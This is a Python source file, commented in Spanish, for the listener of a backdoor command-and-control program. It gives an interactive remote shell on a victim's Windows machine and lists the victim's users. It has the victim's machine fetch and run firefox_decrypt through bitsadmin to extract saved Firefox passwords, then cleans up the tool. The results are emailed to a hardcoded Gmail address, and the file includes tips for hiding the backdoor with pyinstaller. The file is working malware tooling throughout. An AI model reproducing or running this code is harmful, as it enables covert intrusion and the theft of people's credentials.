#!/usr/bin/env python3
"""
Listener para el backdoor

Para hacer invisible el backdoor se puede utilizar pyinstaller con la 
opción --noconsole

pyinstaller --onefile --noconsole listener.py

"""
import dotenv
import os
import signal
import smtplib
import socket
import sys
from email.mime.text import MIMEText
from termcolor import colored

def handler(signum, frame):
    """
    Manejador de señales
    """
    print(colored("\n\n[!] Saliendo...", "red"))
    exit(1)
signal.signal(signal.SIGINT, handler)


class Listener:

    def __init__(self, ip, port):
        """
        Constructor de la clase
        """

        self.options = {
            "exit": "Exit C2 program",
            "get firefox": "Get Firefox store passwords",
            "get users": "List system valid user (gmail)",
            "help": "Show this help panel"
        }

        dotenv.load_dotenv()

        self.app_passwd = os.getenv("APP_PASSWD")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((ip, port))
        s.listen()

        print("\n[+] Listening for incoming connections")

        self.client_socket, client_address = s.accept()

        print(colored(f"\n[+] {client_address} connected", "green"))

    def execute_remotely(self, command):
        """
        Ejecuta un comando en la máquina remota
        """

        self.client_socket.send(command.encode())

        return self.client_socket.recv(2048).decode()

    def send_email(self, subject, body, sender, recipients, password):
        """
        Envia un email con el reporte de teclas presionadas
        """

        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:

            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

        print(f"[i] Email sent Successfully!\n")

    def get_users(self):
        """
        Envía los usuarios de la víctima por correo
        """

        output_command_get_user = self.execute_remotely("net user")

        self.send_email(
            "Users lists INFO - C2",
            output_command_get_user,
            "keyloggerseginf@gmail.com",
            ["keyloggerseginf@gmail.com"],
            self.app_passwd
        )

    def get_firefox_profiles(self, username):
        """
        Consigue el profile de firefox
        """

        path = f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"

        command = f"dir {path}"

        try:

            output_command_dir = self.execute_remotely(command)

            profile_line = next(line for line in output_command_dir.split(
                '\n') if "release" in line)

            profile_name = profile_line.split()[-1]

            return profile_name

        except Exception as e:

            print(f"\n[!] Error al obtener el profile de Firefox.\nError: {e}")

            return None

    def get_firefox_passwords(self, username, profiles):
        """
        Extrae las contraseñas guardadas en un profile de firefox
        """

        url_download = "https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py"
        path_download = "%TEMP%\\firefox_decrypt.py"
        options_download = "/transfer midescarga /download /priority normal"
        command_download = f"bitsadmin {options_download} {url_download} {path_download}"

        firefox_profile_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{profiles}"

        try:
            self.execute_remotely(command_download)

            command = f"python %TEMP%\\firefox_decrypt.py {firefox_profile_path}"

            passwords = self.execute_remotely(command)

            self.execute_remotely("del %TEMP%\\firefox_decrypt.py")

        except Exception as e:

            print(f"\n[!] Error al obtener las contraseñas de Firefox.\nError: {e}")

            return None

        return passwords

    def show_help(self):
        """
        Muestra la ayuda de los métodos especiales del C2
        """

        print(colored(
            "Programa \"Command & Control\" realizado con mucho cariño.\n",
            "blue"
        ))

        for key, value in self.options.items():

            print(colored(f"\t{key} \t- {value}", "blue"))

    def run(self):
        """
        Ejecuta el listener
        """

        while True:

            command = input(colored("\n>> ", "blue"))

            if command == "exit":

                self.client_socket.close()

                exit(0)

            elif command == "get users":

                self.get_users()

            elif command == "get firefox":

                username_str = self.execute_remotely("whoami")
                username = username_str.split("\\")[1].strip()

                profiles = self.get_firefox_profiles(username)

                if not username or not profiles:

                    sys.exit(
                        f"\n[!] No ha sido posible obtener el nombre de usuario o el profile válido de firefox")

                passwords = self.get_firefox_passwords(username, profiles)

                if passwords:

                    self.send_email(
                        "Decrypted Firefox Passwords INFO",
                        passwords,
                        "keyloggerseginf@gmail.com",
                        ["keyloggerseginf@gmail.com"],
                        self.app_passwd
                    )

                else:

                    print(f"[!] No se han encontrado contraseñas")

            elif command == "help":

                self.show_help()

            else:

                command_output = self.execute_remotely(command)

                print(colored(command_output, "blue"))


if __name__ == "__main__":

    my_listener = Listener("192.168.1.119", 443)
    my_listener.run()
